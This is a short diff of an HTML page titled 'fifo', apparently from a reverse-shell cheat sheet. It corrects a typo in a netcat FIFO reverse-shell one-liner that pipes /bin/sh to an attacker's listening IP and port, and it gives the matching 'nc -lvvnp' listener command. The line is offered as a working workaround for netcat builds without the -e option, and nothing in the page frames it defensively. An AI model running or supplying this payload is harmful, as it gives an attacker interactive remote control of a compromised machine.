@@ -5,4 +5,4 @@
 <title>fifo</title>
 </head><body>LISTEN WITH: nc -lvvnp &lt;LPORT&gt;<br/>
 <br/>
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp; 1 | nc &lt;LIP&gt; &lt;LPORT&gt; &gt;/tmp/f&#09;&#09;&#09;possible workaround without -e argument using FIFO</body></html>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc &lt;LIP&gt; &lt;LPORT&gt; &gt;/tmp/f&#09;&#09;&#09;possible workaround without -e argument using FIFO</body></html>
